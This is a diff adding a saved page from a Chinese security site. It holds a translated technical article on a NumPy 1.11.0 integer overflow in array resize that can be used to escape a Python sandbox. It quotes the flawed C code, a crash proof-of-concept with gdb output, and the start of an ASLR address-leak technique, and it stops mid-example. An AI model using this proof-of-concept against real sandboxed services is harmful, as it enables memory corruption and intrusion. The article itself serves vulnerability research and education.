@@ -1,0 +1,984 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns:wb="http://open.weibo.com/wb" xml:lang="en" lang="en">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+    <meta name="viewport"
+          content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no"/>
+    <link rel="shortcut icon" href="http://bobao.360.cn/favicon.ico?v=1.1"/>
+    <link rel="alternate" title="安全资讯" href="/rss?type=news" type="application/rss+xml"/>
+    <link rel="alternate" title="安全知识" href="/rss?type=learning" type="application/rss+xml"/>
+    <link rel="alternate" title="安全圈活动" href="/rss?type=activity" type="application/rss+xml"/>
+    <link rel="alternate" title="所有漏洞" href="/rss?type=vul" type="application/rss+xml"/>
+    <link rel="alternate" title="通用型漏洞" href="/rss?type=commonvul" type="application/rss+xml"/>
+    <link rel="alternate" title="事件型漏洞" href="/rss?type=eventvul" type="application/rss+xml"/>
+    <link rel="alternate" title="热门漏洞" href="/rss?type=hotvul" type="application/rss+xml"/>
+
+        <title>【技术分享】利用内存破坏漏洞实现 Python 沙盒逃逸 - 安全客 - 有思想的安全新媒体</title>
+    
+        <meta name="keywords" content="Python 沙盒逃逸,python安全"/>
+    
+        <meta name="description" content="Python模块通常是包装后的C代码，那么我们是否可以实现篡改内存或者利用内存破坏的漏洞来实现Python的沙盒逃逸？本篇文章针对Python的一个内存破坏漏洞导致的沙盒逃逸漏洞进行分析。"/>
+        <meta property="wb:webmaster" content="224437c7be31d633"/>
+
+    <script type="text/javascript" src="http://s7.qhimg.com/!56caa871/xpc_sync_height.js"></script>
+    <link rel="stylesheet" type="text/css" href="/css/reset.css" />
+    <link rel="stylesheet" type="text/css" href="/css/common_new.css?v=4.4.2.1" />
+    <link rel="stylesheet" type="text/css" href="/css/jquery.notyfy.css" />
+    <link rel="stylesheet" type="text/css" href="/css/notyfy.theme.default.css" />
+    <link rel="stylesheet" type="text/css" href="/css/s_common.css?v=2.2.7" media="only screen and
+    (max-device-width:900px), only screen and (max-width:900px)" />
+    <script type="text/javascript" src="/js/jquery.min.js?v=3.1"></script>
+    <script type="text/javascript" src="/js/jquery.notyfy.js"></script>
+    <script type="text/javascript" src="/js/iscroll.js"></script>
+    <script src="http://js.passport.qihucdn.com/5.0.3.js"></script>
+    <script type="text/javascript">
+        var myScroll, myNavScroll;
+
+        function iscrollLoaded() {
+            myScroll = new IScroll('#wrapper',
+                {
+                    scrollX: true,
+                    scrollY: false,
+                    bounceEasing: 'circular',
+                    eventPassthrough: true,
+                    preventDefault: false,
+                    bounceTime: 500
+                }
+            );
+        }
+
+        $(function () {
+
+            //导航横向滚动
+
+
+            function setNavWidth() {
+
+                /* 计算导航宽度 */
+                var allWidth = $(window).width();
+                var scroller = $('#scroller');
+
+                if (allWidth > 900) {
+                    scroller.find('ul').add(scroller.find('.scroll')).removeAttr('style');
+                    scroller.css('overflow', 'visible');
+                    if (myNavScroll) myNavScroll.destroy();
+                } else {
+
+                    var width = 0;
+                    scroller.find('.scroll').children('ul').children('li').each(function (index, el) {
+                        if (!$(this).hasClass('mobile-hide')) {
+                            width += $(this).outerWidth();
+                        }
+                    });
+                    scroller.find('ul').add(scroller.find('.scroll')).width(width);
+
+                    if (myNavScroll) myNavScroll.destroy();
+
+                    myNavScroll = new IScroll('#scroller', {
+                        scrollX: true,
+                        scrollY: false,
+                        momentum: false,
+                        click: true
+                    });
+
+                }
+
+            }
+
+            setNavWidth();
+            $(window).resize(function (event) {
+                setNavWidth();
+            });
+
+        });
+
+    </script>
+</head>
+<body onload="iscrollLoaded();">
+<div style='margin:0 auto;width:0px;height:0px;overflow:hidden;'>
+    <img src=""/>
+</div>
+
+<div id="is-mobile"></div>
+<div class="container">
+        <div class="mobile-header">
+        <div class="header clearfix">
+            <div class="header-wrapper clearfix">
+                <a href="/index/index" class="logo"><img class="slogan" src="/img/logo.png?v=1.5"/></a>
+                                <form id="search" class="search-box" action="/search/index" method="GET">
+                    <input class="keys" name="keywords" type="text" placeholder="搜索漏洞" required="required">
+                    <input class="icon" type="submit" value="">
+                    <input type="hidden" name="type" value=""/>
+                </form>
+                <div class="bug">
+                    <div class="name"><span class="seled">全部</span><i class="arrow"></i></div>
+                    <ul class="typelist">
+                        <li data-index="3"><a href="javascript:void(0);">全部</a></li>
+                        <li data-index="0"><a href="javascript:void(0);">漏洞</a></li>
+                        <li data-index="1"><a href="javascript:void(0);">资讯</a></li>
+                        <li data-index="2"><a href="javascript:void(0);">知识</a></li>
+                    </ul>
+                </div>
+                                <div class="logNreg mobile-hide">
+                    <div class="unlog">
+                        <i></i>
+                        <a href="log.html" class="log">登录</a>
+                        <span>|</span>
+                        <a href="reg.html" class="reg">注册</a>
+                    </div>
+                    <div class="loged">
+                        <a href="/member/profile" class="user-center"><i></i><span class="user-name-tag">个人中心</span></a>
+                        <div class="user-links">
+                            <span class="arrow"></span>
+                            <ul>
+                                <li class="account-setting"><a href="http://i.360.cn/profile/accountmanage"
+                                                               target="_blank"><i></i><span>账号设置</span></a></li>
+                                <li class="alert-setting"><a href="/keywords/index"
+                                                             target="_blank"><i></i><span>告警设置</span></a></li>
+                                <li class="bug-alert"><a href="/myalarm/index" target="_blank"><i></i><span>漏洞告警</span></a>
+                                </li>
+                                <li class="my-knowl"><a href="/mylearn/index" target="_blank"><i></i><span>我的知识</span></a>
+                                </li>
+                                <li class="my-knowl"><a href="/mycourse/index" target="_blank"><i></i><span>我的课堂</span></a>
+                                </li>
+                                <li class="my-exit"><a
+                                            href="http://login.360.cn/?src=pcw_adlab&op=logout&destUrl=http://bobao.360.cn"><i></i><span>退出系统</span></a>
+                                </li>
+                            </ul>
+                        </div>
+
+                        <a href="/message" class="message-center" target="_blank"><i></i><span>我的消息</span></a>
+                        <div class="message-links">
+                            <span class="arrow"></span>
+                            <ul>
+                                <li class="account-setting" style="display:none;"><a href="/myres/index"
+                                                                                     target="_blank"><i></i><span>回复我的</span></a>
+                                </li>
+                                <li class="my-bug"><a href="/myvul/index"
+                                                      target="_blank"><i></i><span>我的漏洞</span></a></li>
+                                <!--<li class="my-bug"><a href="/myres/index" target="_blank"><i></i><span>我的评论</span></a></li>-->
+                                <!--<li class="alert-setting"><a href="###" target="_blank"><i></i><span>提到我的</span></a>
+                                </li>-->
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <style type="text/css">
+            .nav {
+                overflow: hidden;
+            }
+
+            .nav .scroll {
+                width: auto;
+            }
+        </style>
+        <div id="wrapper">
+            <div id="scroller" class="nav">
+                <div class="scroll">
+                    <ul class="nav-list">
+                        <li ><a class="link-nav"
+                                                                                 href="/index/index">首页</a>
+                        </li>
+                        <li >
+                        <a class="link-nav" href="/vul/index">漏洞</a>
+                        </li>
+                        <li >
+                        <a class="link-nav" href="/introduce/list">招聘</a>
+                        </li>
+                        <li >
+                        <a class="link-nav" href="/news/index">资讯</a><!--<i class="arrow mobile-hide"></i>
+                        <ul class="subnav-list mobile-hide">
+                            <li><a class="link-subnav" href="/introduce/list">招聘</a></li>
+                        </ul>
+			-->
+                        </li>
+                        <li class="cur">
+                        <a class="link-nav" href="/learning/index">知识</a><i class="arrow mobile-hide"></i>
+                        <ul class="subnav-list mobile-hide">
+                            <li><a class="link-subnav" href="/course/index">学院</a></li>
+                        </ul>
+                        </li>
+                        <li ><a class="link-nav"
+                                                               href="/activity/index">活动</a></li>
+                        <li class="mobile-hide "><a class="link-nav"
+                                                                                                   href="/ctf/index">CTF训练营</a>
+                        </li>
+                        <li ><a class="link-nav"
+                                                               href="/interref/list">安全内参</a></li>
+                        <li ><a class="link-nav" href="/app/index">APP</a></li>
+
+                        <!--<li ><a href="/course/index">学院</a></li>-->
+                        <!--<li ><a href="/introduce/list">招聘</a></li>-->
+                        <!--<li  class="mobile-hide"><a href="/ctf/index">CTF训练营</a></li>-->
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="mobile-content">
+        <link rel="stylesheet" type="text/css" href="/css/news.css?v=3.5" />
+<link rel="stylesheet" type="text/css" href="/ue/SyntaxHighlighter/shCoreDefault.css?v=1.0" />
+<style>
+    p .syntaxhighlighter {
+        width: 80%;
+    }
+</style>
+
+<div class="cur-pos w1000">当前位置：<a href="http://bobao.360.cn/">安全客</a> &gt;&gt; 知识详情</div>
+
+<div class="content clearfix">
+    <div class="main">
+        <div class="article">
+            <div id="article_box">
+                <h2>【技术分享】利用内存破坏漏洞实现 Python 沙盒逃逸</h2>
+                <div class="article-msg">
+                    <span class="time">2017-04-06 10:53:26</span>
+                    
+                                        <span class="read">阅读：16591次</span>
+                    <span><a style="display: none;" class="good" href="javascript:;"
+                             data-target="/learning/good" data-value="g_3701"
+                             data-type="learning">点赞(0)</a></span>
+                    <span><a class="fav" href="javascript:;" data-target="/mylearning/add"
+                             data-pk="3701" data-type="learning">收藏</a></span>
+                                        <span><a style="margin-left: 4px;" class="fav" href="https://hackernoon.com/python-sandbox-escape-via-a-memory-corruption-bug-19dde4d5fea5?gi=90438c9b4429"
+                             target="_blank">来源： hackernoon.com</a></span>
+                    
+                    
+                    <div style="margin-top:10px; ">
+                        <a href="/member/contribute?uid=820455891" style="color:#848e99;">
+                            <img src="http://p1.qhmsg.com/dm/150_150_100/t0181f6dca2bb0e1569.jpg" data-is-avatar="true"
+                                 style="border: 1px solid #d5d5d5;padding: 2px; width: 80px;height: 80px;border-radius: 43px;"/>
+                        </a>
+
+                    </div>
+                    <span class="orig">作者：<a href="/member/contribute?uid=820455891" style="color:#848e99;">beswing</a></span>
+                                    </div>
+                <hr size="1">
+                <div class="article-msg">
+                    <p><!-- JiaThis Button BEGIN -->
+
+<!--
+<span class="jiathis_style"><span class="jiathis_txt">分享到：</span>
+	<a class="jiathis_button_weixin"></a>
+	<a class="jiathis_button_tsina"></a>
+    <a class="jiathis_button_tqq"></a>
+    <a class="jiathis_button_qzone"></a>
+    <a class="jiathis_button_renren"></a>
+    <a class="jiathis_button_xiaoyou"></a>
+    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
+</span>
+
+-->
+</p>
+                </div>
+                <p><p style="text-align: center; text-indent: 0em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><img src="http://p6.qhimg.com/t01e07ec5567e9cdf15.jpg" title="t0154ee0db7bbb8d643.jpg" alt="http://p5.qhimg.com/t0154ee0db7bbb8d643.jpg"/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; word-break: break-all; text-indent: 2em; background-color: rgb(255, 255, 255);"><span style="color: rgb(0, 112, 192); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px; font-weight: 900;">作者：</span><a href="http://bobao.360.cn/member/contribute?uid=820455891" target="_self" textvalue="beswing" style="text-decoration: none;"><span style="color: rgb(0, 112, 192); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px; font-weight: 900;">beswing</span></a></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; text-indent: 2em; background-color: rgb(255, 255, 255);"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(0, 112, 192); font-size: 18px; font-weight: 900;">预估稿费：200RMB</span></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; text-indent: 2em; background-color: rgb(255, 255, 255);"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(0, 112, 192); font-size: 18px; font-weight: 900;">投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">索性跳过了文作者的自述，我们直接进入到技术细节吧~</span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Python环境使用自定义白名单/黑名单方案来阻止访问危险的内置函数，模块，函数等。基于操作系统的隔离提供了一些额外的保护（虽然可能有些过时）。 打破锁定的Python解释器不是一个100％的胜利，但它使攻击者能够威胁到操作系统本身。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">作者，是这么认为的，Python模块通常是包装后的C代码，那么我们是否能发现内存被恶意篡改或者利用内存破坏的漏洞来实现Python沙盒的逃逸？</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">那么，我们该从哪入手。 我知道在Python]沙箱中只能import白名单中的Python模块。 也许我应该运行一个分布式的AFL fuzzer网络？ 还是一个符号执行引擎？ 或者也许我应该用最先进的静态分析工具扫描它们？ 当然，我可以做任何这些事情。 或者我可以跟踪一些曾经出现的bug，来查询是否有仍有可利用的存在。</span></p><p style="text-align:center"><img src="http://p6.qhimg.com/t01966abde7cd4718c4.png" title="t01a7c8844e99c4d768.png" alt="http://p7.qhimg.com/t01a7c8844e99c4d768.png"/></p><p style="text-align:center"><img src="http://p6.qhimg.com/t01b302eff471150634.png" title="t01890ffb07d6e27e0e.png" alt="http://p4.qhimg.com/t01890ffb07d6e27e0e.png"/></p><p style="text-align:center"><img src="http://p0.qhimg.com/t012e3cb25db632765f.png" title="t017d8a47e591693881.png" alt="http://p7.qhimg.com/t017d8a47e591693881.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在作者通过手动代码的审查和测试中，发现了一个Pyhon沙盒白名单的模块的一个可以用的内存破坏漏洞。这个bug，存在于Numpy模块。这是一个一个用python实现的科学计算包。包括：1、一个强大的N维数组对象Array；2、比较成熟的（广播）函数库；3、用于整合C/C++和Fortran代码的工具包；4、实用的线性代数、傅里叶变换和随机数生成函数。numpy和稀疏矩阵运算包scipy配合使用更加方便。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">NumPy（Numeric Python）提供了许多高级的数值编程工具，如：矩阵数据类型、矢量处理，以及精密的运算库。专为进行严格的数字处理而产生。多为很多大型金融公司使用，以及核心的科学计算组织如：Lawrence Livermore，NASA用其处理一些本来使用C++，Fortran或Matlab等所做的任务。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">如果要从Numpy作为入手，那么我先来分析源码，首先作者查看了代码的行数：</span></p><pre class="brush:plain;toolbar:false">$&nbsp;cloc&nbsp;*&nbsp;520&nbsp;text&nbsp;files.&nbsp;516&nbsp;unique&nbsp;files.&nbsp;43&nbsp;files&nbsp;ignored.http://cloc.sourceforge.net&nbsp;v&nbsp;1.60&nbsp;T=2.42&nbsp;s&nbsp;(196.7&nbsp;files/s,&nbsp;193345.0&nbsp;lines/s)&nbsp;—&nbsp;—&nbsp;—&nbsp;—&nbsp;—&nbsp;—&nbsp;—&nbsp;—&nbsp;—&nbsp;—&nbsp;—&nbsp;—&nbsp;—&nbsp;—&nbsp;—&nbsp;—&nbsp;—&nbsp;—&nbsp;—&nbsp;—Language&nbsp;files&nbsp;blank&nbsp;comment&nbsp;code&nbsp;—&nbsp;—&nbsp;—&nbsp;—&nbsp;—&nbsp;—&nbsp;—&nbsp;—&nbsp;—&nbsp;—&nbsp;—&nbsp;—&nbsp;—&nbsp;—&nbsp;—&nbsp;—&nbsp;—&nbsp;—&nbsp;—&nbsp;—&nbsp;C&nbsp;68&nbsp;36146&nbsp;70025&nbsp;170992Python&nbsp;311&nbsp;27718&nbsp;57961&nbsp;87081C/C++&nbsp;Header&nbsp;82&nbsp;1778&nbsp;2887&nbsp;7847Cython&nbsp;1&nbsp;947&nbsp;2556&nbsp;1627Fortran&nbsp;90&nbsp;10&nbsp;52&nbsp;12&nbsp;136Fortran&nbsp;77&nbsp;3&nbsp;2&nbsp;1&nbsp;83make&nbsp;1&nbsp;15&nbsp;19&nbsp;62&nbsp;—&nbsp;—&nbsp;—&nbsp;—&nbsp;—&nbsp;—&nbsp;—&nbsp;—&nbsp;—&nbsp;—&nbsp;—&nbsp;—&nbsp;—&nbsp;—&nbsp;—&nbsp;—&nbsp;—&nbsp;—&nbsp;—&nbsp;—&nbsp;SUM:&nbsp;476&nbsp;66658&nbsp;133461&nbsp;267828</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">近20万行的C代码。而且这里存在一些bug。在这篇文章的其余部分，我首先描述导致这个漏洞的条件。 接下来，我讨论一些使用开发人员应该意识到的CPython运行时的行为，然后我将逐步了解实际的漏洞。 最后，我将思考量化在Python应用程序中的内存损坏问题的风险。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">The Vulnerability</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">我将要通过的漏洞是Numpy v1.11.0（也许是旧版本）的整数溢出错误。 自v1.12.0以来，该问题已经解决，但没有发布安全咨询。该漏洞驻留在用于调整Numpy的多维数组类对象（ ndarray和friends）的API中。 调用resize调用定义数组形状的元组，其中元组的每个元素都是维的大小。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">&nbsp;&nbsp;&nbsp;&nbsp;$&nbsp;python
+&nbsp;&nbsp;&nbsp;&nbsp;&gt;&gt;&gt;&nbsp;import&nbsp;numpy&nbsp;as&nbsp;np
+&nbsp;&nbsp;&nbsp;&nbsp;&gt;&gt;&gt;&nbsp;arr&nbsp;=&nbsp;np.ndarray((2,&nbsp;2),&nbsp;‘int32’)
+&nbsp;&nbsp;&nbsp;&nbsp;&gt;&gt;&gt;&nbsp;arr.resize((2,&nbsp;3))
+&nbsp;&nbsp;&nbsp;&nbsp;&gt;&gt;&gt;&nbsp;arrarray([[-895628408,&nbsp;32603,&nbsp;-895628408],[&nbsp;32603,&nbsp;0,&nbsp;0]],&nbsp;dtype=int32)</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">Sidenote：嗯，数组正在泄漏未初始化的内存，但是我们不会专注于这个post。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在覆盖下，resize实际上的realloc缓冲区，其大小计算为形状元组和元素大小中每个元素的乘积。 所以在前面的代码片段中，arr.resize((2, 3))归结为C代码realloc(buffer, 2 * 3 * sizeof(int32))。 下一个代码片段是C中resize实现。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">NPY_NO_EXPORT&nbsp;PyObject&nbsp;*
+PyArray_Resize(PyArrayObject&nbsp;*self,&nbsp;PyArray_Dims&nbsp;*newshape,&nbsp;int&nbsp;refcheck,
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NPY_ORDER&nbsp;order)
+{
+&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;npy_intp&nbsp;is&nbsp;`long&nbsp;long`
+&nbsp;&nbsp;&nbsp;&nbsp;npy_intp*&nbsp;new_dimensions&nbsp;=&nbsp;newshape-&gt;ptr;
+&nbsp;&nbsp;&nbsp;&nbsp;npy_intp&nbsp;newsize&nbsp;=&nbsp;1;
+&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;new_nd&nbsp;=&nbsp;newshape-&gt;len;
+&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;k;
+&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;NPY_MAX_INTP&nbsp;is&nbsp;MAX_LONGLONG&nbsp;(0x7fffffffffffffff)
+&nbsp;&nbsp;&nbsp;&nbsp;npy_intp&nbsp;largest&nbsp;=&nbsp;NPY_MAX_INTP&nbsp;/&nbsp;PyArray_DESCR(self)-&gt;elsize;
+&nbsp;&nbsp;&nbsp;&nbsp;for(k&nbsp;=&nbsp;0;&nbsp;k&nbsp;&lt;&nbsp;new_nd;&nbsp;k++)&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;newsize&nbsp;*=&nbsp;new_dimensions[k];
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(newsize&nbsp;&lt;=&nbsp;0&nbsp;||&nbsp;newsize&nbsp;&gt;&nbsp;largest)&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;PyErr_NoMemory();
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+&nbsp;&nbsp;&nbsp;&nbsp;}
+&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(newsize&nbsp;==&nbsp;0)&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sd&nbsp;=&nbsp;PyArray_DESCR(self)-&gt;elsize;
+&nbsp;&nbsp;&nbsp;&nbsp;}
+&nbsp;&nbsp;&nbsp;&nbsp;else&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sd&nbsp;=&nbsp;newsize*PyArray_DESCR(self)-&gt;elsize;
+&nbsp;&nbsp;&nbsp;&nbsp;}
+&nbsp;&nbsp;&nbsp;&nbsp;/*&nbsp;Reallocate&nbsp;space&nbsp;if&nbsp;needed&nbsp;*/
+&nbsp;&nbsp;&nbsp;&nbsp;new_data&nbsp;=&nbsp;realloc(PyArray_DATA(self),&nbsp;sd);
+&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(new_data&nbsp;==&nbsp;NULL)&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PyErr_SetString(PyExc_MemoryError,
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;cannot&nbsp;allocate&nbsp;memory&nbsp;for&nbsp;array”);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;NULL;
+&nbsp;&nbsp;&nbsp;&nbsp;}
+&nbsp;&nbsp;&nbsp;&nbsp;((PyArrayObject_fields&nbsp;*)self)-&gt;data&nbsp;=&nbsp;new_data;</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我们可以在代码段中找到漏洞。 您可以在for循环（第13行）中看到每个维度相乘以产生新的大小。 稍后（第25行），将新大小和元素大小的乘积作为大小传递给保存数组的realloc内存。 在realloc之前有一些关于新大小的验证，但是它不会检查整数溢出，这意味着非常大的维度可能导致分配的大小不足的数组。最终，这给攻击者一个强大的攻击途径：通过从具有overflown大小的数组进行索引来读取或写入任意内存的能力。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我们写一个Poc来验证漏洞：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">$&nbsp;cat&nbsp;poc.py
+import&nbsp;numpy&nbsp;as&nbsp;np
+arr&nbsp;=&nbsp;np.array(&#39;A&#39;*0x100)
+arr.resize(0x1000,&nbsp;0x100000000000001)
+print&nbsp;&quot;bytes&nbsp;allocated&nbsp;for&nbsp;entire&nbsp;array:&nbsp;&nbsp;&nbsp;&nbsp;&quot;&nbsp;+&nbsp;hex(arr.nbytes)&nbsp;
+print&nbsp;&quot;max&nbsp;#&nbsp;of&nbsp;elemenets&nbsp;for&nbsp;inner&nbsp;array:&nbsp;&nbsp;&quot;&nbsp;+&nbsp;hex(arr[0].size)
+print&nbsp;&quot;size&nbsp;of&nbsp;each&nbsp;element&nbsp;in&nbsp;inner&nbsp;array:&nbsp;&quot;&nbsp;+&nbsp;hex(arr[0].itemsize)&nbsp;
+arr[0][10000000000]
+$&nbsp;python&nbsp;poc.py
+bytes&nbsp;allocated&nbsp;for&nbsp;entire&nbsp;array:&nbsp;&nbsp;&nbsp;&nbsp;0x100000
+max&nbsp;#&nbsp;of&nbsp;elemenets&nbsp;for&nbsp;inner&nbsp;array:&nbsp;&nbsp;0x100000000000001
+size&nbsp;of&nbsp;each&nbsp;element&nbsp;in&nbsp;inner&nbsp;array:&nbsp;0x100
+[1]&nbsp;&nbsp;&nbsp;&nbsp;2517&nbsp;segmentation&nbsp;fault&nbsp;(core&nbsp;dumped)&nbsp;&nbsp;python&nbsp;poc.py
+$&nbsp;gdb&nbsp;`which&nbsp;python`&nbsp;core
+...
+Program&nbsp;terminated&nbsp;with&nbsp;signal&nbsp;SIGSEGV,&nbsp;Segmentation&nbsp;fault.
+(gdb)&nbsp;bt
+#0&nbsp;0x00007f20a5b044f0&nbsp;in&nbsp;PyArray_Scalar&nbsp;(data=0x8174ae95f010,&nbsp;descr=0x7f20a2fb5870,&nbsp;
+&nbsp;base=&lt;numpy.ndarray&nbsp;at&nbsp;remote&nbsp;0x7f20a7870a80&gt;)&nbsp;at&nbsp;numpy/core/src/multiarray/scalarapi.c:651
+#1&nbsp;0x00007f20a5add45c&nbsp;in&nbsp;array_subscript&nbsp;(self=0x7f20a7870a80,&nbsp;op=&lt;optimized&nbsp;out&gt;)
+&nbsp;at&nbsp;numpy/core/src/multiarray/mapping.c:1619
+#2&nbsp;0x00000000004ca345&nbsp;in&nbsp;PyEval_EvalFrameEx&nbsp;()&nbsp;at&nbsp;../Python/ceval.c:1539…
+(gdb)&nbsp;x/i&nbsp;$pc
+=&gt;&nbsp;0x7f20a5b044f0&nbsp;&lt;PyArray_Scalar+480&gt;:&nbsp;cmpb&nbsp;$0x0,(%rcx)
+(gdb)&nbsp;x/g&nbsp;$rcx
+0x8174ae95f10f:&nbsp;Cannot&nbsp;access&nbsp;memory&nbsp;at&nbsp;address&nbsp;0x8174ae95f10f
+CPython运行时的quirks</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">在编写漏洞的利用脚本之前。想讨论一些CPython运行时可以轻松利用漏洞的方法，同时也讨论了如何使漏洞利用开发人员受挫。 如果您想直接进入漏洞利用，请随意跳过本节。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">泄漏内存地址</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">通常情况下，首要苦难之一就是绕过地址空间布局随机化（ASLR）。 幸运的是，对于攻击者来说，Python使得这很容易。 内置的id函数返回对象的内存地址，或者更准确地说，封装对象的PyObject结构的地址。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">$&nbsp;gdb&nbsp;-q&nbsp;—&nbsp;arg&nbsp;/usr/bin/python2.7&nbsp;(gdb)&nbsp;run&nbsp;-i&nbsp;
+…
+&nbsp;&gt;&gt;&gt;&nbsp;a&nbsp;=&nbsp;‘A’*0x100&nbsp;
+&nbsp;&gt;&gt;&gt;&nbsp;b&nbsp;=&nbsp;‘B’*0x100000&nbsp;
+&nbsp;&gt;&gt;&gt;&nbsp;import&nbsp;numpy&nbsp;as&nbsp;np&nbsp;
+&nbsp;&gt;&gt;&gt;&nbsp;c&nbsp;=&nbsp;np.ndarray((10,&nbsp;10))&nbsp;
+&nbsp;&gt;&gt;&gt;&nbsp;hex(id(a))&nbsp;
+&nbsp;‘0x7ffff7f65848’&nbsp;
+&nbsp;&gt;&gt;&gt;&nbsp;hex(id(b))
+&nbsp;&nbsp;‘0xa52cd0’&nbsp;
+&nbsp;&gt;&gt;&gt;&nbsp;hex(id(c))
